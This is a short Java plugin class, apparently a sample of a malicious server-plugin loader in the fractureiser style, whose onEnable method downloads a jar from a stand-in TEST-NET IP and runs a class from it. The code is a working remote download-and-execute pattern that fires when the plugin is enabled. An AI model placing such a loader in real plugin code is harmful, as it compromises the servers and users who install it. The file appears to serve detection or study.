package com.acme.mod;

import java.net.URL;
import java.net.URLClassLoader;

// Server-plugin loader shape (fractureiser/Skyrage style): fetches a jar from a raw
// IP and runs a class from it. 203.0.113.0/24 is TEST-NET-3 (RFC 5737), unroutable.
public class Loader {
    public void onEnable() throws Exception {
        URLClassLoader cl = new URLClassLoader(new URL[]{new URL("http://203.0.113.7/u.jar")});
        cl.loadClass("Utility").getMethod("run").invoke(null);
    }
}
